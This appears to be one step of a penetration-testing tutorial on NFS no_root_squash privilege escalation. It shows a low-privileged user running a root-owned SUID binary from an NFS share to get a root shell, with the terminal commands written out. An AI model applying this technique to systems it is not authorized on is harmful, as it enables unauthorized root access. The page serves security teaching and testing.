Exploitation Step 4

Gaining Root on the Target Server

Executing the SUID binary from a low-privileged shell.

Execute on Target

From your low-privileged shell on the target, navigate to the NFS share's path and execute the SUID binary. The no_root_squash option ensures the SUID bit is honored.

Verify Root Access

  • Upon execution, you should be dropped into a new shell.
  • Use the whoami command to confirm that your effective user is now root.
  • This signifies successful privilege escalation.
Key Takeaway

The execution of the SUID binary on the target server, enabled by no_root_squash, is the final step to achieving full root access.

Terminal: Target Server (Low-Privileged Shell)
user@target:~$ cd /opt/data
user@target:/opt/data$ ls -l rootshell
-rwsr-xr-x 1 root root 8400 Sep 27 10:35 rootshell
user@target:/opt/data$ ./rootshell
root@target:/opt/data# whoami
root
root@target:/opt/data#

Explanation:

  • We navigate to the NFS share directory on the target.
  • We confirm the SUID bit is set and the file is owned by root.
  • Executing ./rootshell immediately grants a root shell, verified by whoami.
